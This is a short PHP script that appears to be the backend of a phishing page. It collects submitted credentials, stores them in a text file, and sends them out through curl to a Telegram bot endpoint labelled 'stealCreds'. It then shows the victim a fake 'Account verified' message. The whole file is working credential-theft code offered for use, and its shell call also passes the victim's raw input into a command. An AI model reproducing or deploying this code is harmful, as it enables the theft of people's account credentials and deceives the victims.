<?php
// v9pei Production - من الـ actual notes
$creds = json_decode(file_get_contents('php://input'), true);
file_put_contents('creds.txt', json_encode($creds)."\n", FILE_APPEND);

// Telegram Exfil (notes v9pei)
shell_exec('curl -X POST https://api.telegram.org/botYOUR_BOT_TOKEN/stealCreds -d "chat_id=YOUR_CHAT_ID&text='.json_encode($creds).'"');
echo '{"success":true,"message":"Account verified"}';
?>
